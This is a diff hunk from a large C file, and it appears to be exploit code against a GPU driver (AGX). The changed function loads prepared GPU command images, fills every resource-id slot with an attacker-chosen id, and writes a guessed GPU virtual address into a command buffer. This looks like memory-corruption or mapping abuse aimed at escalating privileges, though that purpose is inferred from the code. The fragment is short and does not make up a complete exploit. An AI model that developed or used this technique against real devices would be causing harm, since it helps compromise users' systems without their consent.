@@ -12924,8 +12924,12 @@ static void p_blithit(void) {
     uint32_t *outw = (uint32_t *)must_map(0x100);
     int ridslot = 0;
 
-    for (ridslot = 0; ridslot < 0x30; ridslot++) {
-        uint64_t g = 0x100018000ULL;              // keep captured GPUVA (irrelevant if id-bound)
+    // combined: all resource-id slots = our rid, +0x340 = candidate GPUVA
+    // candidate: out+0x00 of our rid = {hi=0x100, lo=offset}; GPUVA guess = 0x1_00000000|lo
+    uint64_t mygpu = 0x100000000ULL | (g_last_res_off & 0xffffffff);
+    LOG("[bh] all-slots=rid %u, candidate GPUVA 0x%llx", rid, mygpu);
+    for (ridslot = 0; ridslot < 1; ridslot++) {   // single iteration now
+        uint64_t g = mygpu;
         memcpy(vaA, agx_A4_image, 0x4000);
         memcpy(vaB, agx_B4_image, 0x4000);
         *(uint64_t *)(vaA + 0xac + 0x340) = g;
@@ -12934,8 +12938,8 @@ static void p_blithit(void) {
         *(uint32_t *)(entry + 0x00) = idA;
         *(uint32_t *)(entry + 0x04) = idB;
         *(uint32_t *)(entry + 0x20) = rid;          // prepare reference -> GPU-map our resource
-        if (ridslot >= 0 && ridslot < 0x40)         // patch one resource-id slot in B
-            *(uint32_t *)(vaB + 0x40 + ridslot * 4) = rid;
+        for (int rs = 0; rs < 0x40; rs++)           // patch ALL resource-id slots
+            *(uint32_t *)(vaB + 0x40 + rs * 4) = rid;
         *(uint64_t *)(entry + 0x10) = (uint64_t)(uintptr_t)aux1;
         *(uint64_t *)(entry + 0x18) = (uint64_t)(uintptr_t)aux2;
         *outw = 0xdeadbeef;
